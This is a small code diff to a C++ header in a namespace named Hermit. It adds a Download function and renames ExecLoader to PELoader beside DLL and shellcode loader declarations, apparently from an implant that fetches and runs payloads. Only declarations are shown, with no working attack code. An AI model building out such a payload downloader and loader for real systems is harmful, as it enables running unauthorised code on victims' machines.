@@ -19,9 +19,10 @@ extern "C" ULONG_PTR Leave(VOID);
 namespace Hermit
 {
     State::PSTATE Init();
+    std::vector<BYTE> Download(State::PSTATE pState);
 
     VOID DLLLoader();
-    VOID ExecLoader();
+    VOID PELoader();
     VOID ShellcodeLoader();
 }
 
